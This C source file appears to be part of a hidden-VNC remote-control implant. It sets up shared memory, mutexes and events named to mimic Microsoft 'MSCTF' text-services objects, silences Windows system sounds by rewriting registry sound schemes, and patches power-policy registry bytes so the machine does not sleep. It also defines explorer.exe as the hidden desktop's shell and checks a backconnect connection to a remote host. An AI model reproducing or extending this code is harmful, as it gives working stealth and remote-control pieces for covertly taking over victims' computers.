#include "..\includes.h"
#include "dib.h"
#include "vnc.h"

bool bXP;
HDESK hDefaultDesktop;

TCHAR szMappingNameFormat[]=_T("MSCTF.Shared.MAPPING.%08x"),
      szKillEventNameFormat[]=_T("MSCTF.Shared.EVENT.%08x"),
      szInputMutexNameFormat[]=_T("MSCTF.Shared.MUTEX.%08x");

void InitGlobalDataNames(PHVNC lpServer)
{
    DWORD dwHash=lpServer->Names.dwHash;
    wsprintf(lpServer->Names.szGlobalMappingName,szMappingNameFormat,dwHash);
    wsprintf(lpServer->Names.szSharedMemMappingName,szMappingNameFormat,dwHash*2);
    wsprintf(lpServer->Names.szClipboardUpdatedEvent,szMappingNameFormat,dwHash*3);
    wsprintf(lpServer->Names.szInputMutex,szInputMutexNameFormat,dwHash);
    wsprintf(lpServer->Names.szSharedMemMutex,szInputMutexNameFormat,dwHash*2);
    wsprintf(lpServer->Names.szVNCKillEventName,szKillEventNameFormat,dwHash);
    wsprintf(lpServer->Names.szSendThreadMessageMutex,szKillEventNameFormat,dwHash*2);
    wsprintf(lpServer->Names.szSendThreadMessageEvent,szKillEventNameFormat,dwHash*3);
    return;
}

bool InitGlobalData(PHVNC lpServer)
{
    bool ret_val=false;
    do
    {
        lpServer->hGlobalVNCMapping=CreateFileMapping(INVALID_HANDLE_VALUE,NULL,PAGE_READWRITE,0,sizeof(GLOBAL_VNC_DATA),lpServer->Names.szGlobalMappingName);
        lpServer->lpGlobalVNCData=(GLOBAL_VNC_DATA *)MapViewOfFile(lpServer->hGlobalVNCMapping,FILE_MAP_ALL_ACCESS,0,0,0);
        if ((!lpServer->lpGlobalVNCData) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->lpGlobalVNCData->dwVNCMessage=RegisterWindowMessageA(lpServer->DeskInfo.szDeskName);
        if (!lpServer->lpGlobalVNCData->dwVNCMessage)
            break;

        lpServer->EventsInfo.hInputMutex=CreateMutex(NULL,false,lpServer->Names.szInputMutex);
        if ((!lpServer->EventsInfo.hInputMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hPaintMutex=CreateMutex(NULL,false,NULL);
        if (!lpServer->EventsInfo.hPaintMutex)
            break;

        lpServer->EventsInfo.hSharedMemMutex=CreateMutex(NULL,false,lpServer->Names.szSharedMemMutex);
        if ((!lpServer->EventsInfo.hSharedMemMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hSendThreadMessageMutex=CreateMutex(NULL,false,lpServer->Names.szSendThreadMessageMutex);
        if ((!lpServer->EventsInfo.hSendThreadMessageMutex) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hSendThreadMessageEvent=CreateEvent(NULL,true,false,lpServer->Names.szSendThreadMessageEvent);
        if ((!lpServer->EventsInfo.hSendThreadMessageEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hVNCKillEvent=CreateEvent(NULL,true,false,lpServer->Names.szVNCKillEventName);
        if ((!lpServer->EventsInfo.hVNCKillEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        lpServer->EventsInfo.hClipboardUpdatedEvent=CreateEvent(NULL,false,false,lpServer->Names.szClipboardUpdatedEvent);
        if ((!lpServer->EventsInfo.hClipboardUpdatedEvent) || (GetLastError() == ERROR_ALREADY_EXISTS))
            break;

        if ((GetWindowsDirectoryA(lpServer->Names.szShell,sizeof(lpServer->Names.szShell))) || (GetEnvironmentVariableA("windir",lpServer->Names.szShell,sizeof(lpServer->Names.szShell))))
            lstrcatA(lpServer->Names.szShell,"\\explorer.exe");
        else
            break;

        ret_val=true;
    }
    while (false);
    return ret_val;
}

#ifndef _INJLIB
TCHAR szPrevSchemeKey[]=_T(".Prev"),
      szCurSchemeKey[]=_T(".current");

void MoveFromKeyToKey(TCHAR *lpFrom,TCHAR *lpTo)
{
    HKEY hRootKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER,_T("AppEvents\\Schemes\\Apps"),0,KEY_WOW64_64KEY+KEY_READ+KEY_WRITE,&hRootKey) == ERROR_SUCCESS)
    {
        DWORD dwKeysNum;
        RegQueryInfoKey(hRootKey,NULL,NULL,NULL,&dwKeysNum,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
        if (dwKeysNum)
        {
            for (DWORD i=0; i < dwKeysNum; i++)
            {
                TCHAR szSubKey[260];
                DWORD dwSize=sizeof(szSubKey);
                if (RegEnumKeyEx(hRootKey,i,szSubKey,&dwSize,NULL,NULL,NULL,NULL) == ERROR_SUCCESS)
                {
                    HKEY hSubKey;
                    if (RegOpenKeyEx(hRootKey,szSubKey,0,KEY_WOW64_64KEY+KEY_READ+KEY_WRITE,&hSubKey) == ERROR_SUCCESS)
                    {
                        DWORD dwSubKeysNum;
                        RegQueryInfoKey(hSubKey,NULL,NULL,NULL,&dwSubKeysNum,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
                        if (dwSubKeysNum)
                        {
                            for (DWORD j=0; j < dwSubKeysNum; j++)
                            {
                                dwSize=sizeof(szSubKey);
                                if (RegEnumKeyEx(hSubKey,j,szSubKey,&dwSize,NULL,NULL,NULL,NULL) == ERROR_SUCCESS)
                                {
                                    HKEY hSubSubKey;
                                    if (RegOpenKeyEx(hSubKey,szSubKey,0,KEY_WOW64_64KEY+KEY_READ+KEY_WRITE,&hSubSubKey) == ERROR_SUCCESS)
                                    {
                                        TCHAR szData[260];
                                        LONG dwSize=sizeof(szData);
                                        if (RegQueryValue(hSubSubKey,lpFrom,szData,&dwSize) == ERROR_SUCCESS)
                                        {
                                            RegSetValue(hSubSubKey,lpTo,REG_SZ,szData,dwSize);
                                            TCHAR cFakeBuf=0;
                                            RegSetValue(hSubSubKey,lpFrom,REG_SZ,&cFakeBuf,sizeof(cFakeBuf));
                                        }
                                        RegCloseKey(hSubSubKey);
                                    }
                                }
                            }
                        }
                        RegCloseKey(hSubKey);
                    }
                }
            }
        }
        RegCloseKey(hRootKey);
    }
    return;
}

void EnableSystemSounds(bool bEnable)
{
    if (bEnable)
        MoveFromKeyToKey(szPrevSchemeKey,szCurSchemeKey);
    else
        MoveFromKeyToKey(szCurSchemeKey,szPrevSchemeKey);
    return;
}

#pragma optimize("",off)
TCHAR szPolicies[]=_T("Policies");
void ChangePowerCfg()
{
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER,_T("Control Panel\\PowerCfg\\GlobalPowerPolicy"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey);
    byte bPowerPolicy[0xB0];
    DWORD dwSize=sizeof(bPowerPolicy),dwType;
    RegQueryValueEx(hKey,szPolicies,NULL,&dwType,bPowerPolicy,&dwSize);

    bPowerPolicy[52]=0x00;
    bPowerPolicy[63]=0x80;
    bPowerPolicy[64]=0x00;
    bPowerPolicy[75]=0x80;
    *(DWORD*)&bPowerPolicy[0xAC]=0x3E0441;

    RegSetValueEx(hKey,szPolicies,0,dwType,bPowerPolicy,dwSize);
    RegCloseKey(hKey);
    return;
}
#pragma optimize("",on)
bool IsConnectionActive(PHVNC lpServer)
{
    bool bRet=true;
    if (lpServer->rfbScreen->backconnect)
    {
        for (int i=0; i < 3; i++)
        {
            bRet=NetworkIsConnectionEstablished(lpServer->rfbScreen->backconnectHost,lpServer->rfbScreen->bcPort);
            if (bRet)
                break;
            Sleep(100);
        }
    }

    return bRet;
}
#endif
